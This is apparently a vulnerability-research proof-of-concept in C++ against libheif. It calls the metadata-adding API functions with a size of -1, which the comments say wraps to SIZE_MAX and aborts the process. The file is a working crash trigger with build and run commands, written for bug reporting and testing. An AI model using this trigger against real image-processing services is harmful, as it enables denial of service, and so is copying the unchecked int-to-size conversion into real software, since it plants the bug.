/*
 * Bug 10 POC: Negative size integer wrap in metadata-writing functions
 *
 * Affected functions:
 *   heif_context_add_generic_metadata()   -- libheif/context.cc:~1793
 *   heif_context_add_XMP_metadata()       -- delegates to add_generic_metadata
 *   heif_context_add_exif_metadata()      -- delegates to add_generic_metadata
 *
 * Vulnerable code: libheif/context.cc:1793-1796
 *   Error HeifContext::add_generic_metadata(..., const void* data, int size, ...)
 *   {
 *     ...
 *     std::vector<uint8_t> data_array;
 *     data_array.resize(size);   // <-- BUG: int -1 silently converts to size_t SIZE_MAX
 *     memcpy(data_array.data(), data, size);
 *   }
 *
 * When size=-1:
 *   - (size_t)(-1) == SIZE_MAX == 18446744073709551615 on 64-bit systems
 *   - data_array.resize(SIZE_MAX) throws std::length_error (or std::bad_alloc)
 *   - The exception is not caught in the C API wrapper -> terminate() -> abort()
 *
 * Build:
 *   clang++ -fsanitize=address -fno-omit-frame-pointer -g -O1 \
 *     -I<libheif_api> -I<cmake_build_dir> \
 *     poc_trigger.cc libheif.a \
 *     /usr/lib/x86_64-linux-gnu/libz.so.1 -lm -lpthread -ldl \
 *     -o poc_trigger
 *
 * Run:
 *   ./poc_trigger 1    # test add_generic_metadata with size=-1
 *   ./poc_trigger 2    # test add_XMP_metadata with size=-1
 *   ./poc_trigger 3    # test add_exif_metadata with size=-1
 */

#include <cstdlib>
#include <cstdio>
#include <cstring>
#include <libheif/heif.h>
#include <libheif/heif_context.h>
#include <libheif/heif_encoding.h>
#include <libheif/heif_image.h>
#include <libheif/heif_image_handle.h>
#include <libheif/heif_metadata.h>

/*
 * Create a minimal image handle using the built-in mask encoder.
 * The mask encoder is always compiled in and requires no external codec plugin.
 */
static heif_image_handle* make_mask_image_handle(heif_context* ctx) {
    heif_image* img = nullptr;
    heif_error err;

    err = heif_image_create(4, 4, heif_colorspace_monochrome, heif_chroma_monochrome, &img);
    if (err.code) {
        fprintf(stderr, "[-] heif_image_create: %s\n", err.message);
        return nullptr;
    }
    err = heif_image_add_plane(img, heif_channel_Y, 4, 4, 8);
    if (err.code) {
        fprintf(stderr, "[-] heif_image_add_plane: %s\n", err.message);
        heif_image_release(img);
        return nullptr;
    }
    int stride = 0;
    uint8_t* plane = heif_image_get_plane(img, heif_channel_Y, &stride);
    memset(plane, 0, stride * 4);

    heif_encoder* enc = nullptr;
    err = heif_context_get_encoder_for_format(ctx, heif_compression_mask, &enc);
    if (err.code || !enc) {
        fprintf(stderr, "[-] heif_context_get_encoder_for_format(mask): %s\n",
                err.message ? err.message : "no encoder");
        heif_image_release(img);
        return nullptr;
    }

    heif_image_handle* hdl = nullptr;
    err = heif_context_encode_image(ctx, img, enc, nullptr, &hdl);
    heif_encoder_release(enc);
    heif_image_release(img);
    if (err.code) {
        fprintf(stderr, "[-] heif_context_encode_image: %s\n", err.message);
        return nullptr;
    }
    return hdl;
}

int main(int argc, char* argv[]) {
    /*
     * which:
     *   1 = heif_context_add_generic_metadata (default)
     *   2 = heif_context_add_XMP_metadata
     *   3 = heif_context_add_exif_metadata
     */
    int which = (argc > 1) ? atoi(argv[1]) : 1;

    fprintf(stderr, "[+] Bug 10 POC: Negative size integer wrap in metadata functions\n");
    fprintf(stderr, "[+] Vulnerable location: libheif/context.cc:~1793\n");
    fprintf(stderr, "[+] int -1 -> (size_t)SIZE_MAX -> std::length_error abort\n");

    heif_context* ctx = heif_context_alloc();
    if (!ctx) { fprintf(stderr, "[-] heif_context_alloc() failed\n"); return 1; }

    heif_image_handle* hdl = make_mask_image_handle(ctx);
    if (!hdl) {
        fprintf(stderr, "[-] Could not obtain image handle\n");
        heif_context_free(ctx);
        return 1;
    }
    fprintf(stderr, "[+] Got image handle\n");

    /* Use a valid (non-null) data pointer; the bug triggers on size, not data */
    const char dummy_data[16] = { 0x01, 0x02, 0x03, 0x04 };
    int neg_size = -1;  /* wraps to SIZE_MAX as size_t */

    heif_error err;

    if (which == 1) {
        fprintf(stderr, "[+] Calling heif_context_add_generic_metadata(size=-1)\n");
        /*
         * size=-1 -> HeifContext::add_generic_metadata(..., -1, ...)
         *   -> data_array.resize(-1)  [implicitly cast: (size_t)-1 == SIZE_MAX]
         *   -> std::length_error("vector::_M_default_append")
         *   -> terminate() -> abort()
         */
        err = heif_context_add_generic_metadata(ctx, hdl, dummy_data, neg_size,
                                                "test", "text/plain");
    } else if (which == 2) {
        fprintf(stderr, "[+] Calling heif_context_add_XMP_metadata(size=-1)\n");
        /*
         * -> add_XMP_metadata(..., -1, ...) -> add_generic_metadata(..., -1, ...)
         * -> same resize(SIZE_MAX) path
         */
        err = heif_context_add_XMP_metadata(ctx, hdl, dummy_data, neg_size);
    } else {
        fprintf(stderr, "[+] Calling heif_context_add_exif_metadata(size=-1)\n");
        /*
         * -> add_exif_metadata(..., -1, ...) -> data_array.resize(-1 + 4)
         * -> data_array.resize(3) then add_generic_metadata with resized data
         * Note: exif path resizes before calling generic; may trigger differently.
         */
        err = heif_context_add_exif_metadata(ctx, hdl, dummy_data, neg_size);
    }

    /* Should not reach here (terminate() is called on uncaught std::length_error) */
    fprintf(stderr, "[-] UNEXPECTED: returned without crash, code=%d message=%s\n",
            err.code, err.message ? err.message : "(null)");

    heif_image_handle_release(hdl);
    heif_context_free(ctx);
    return 0;
}
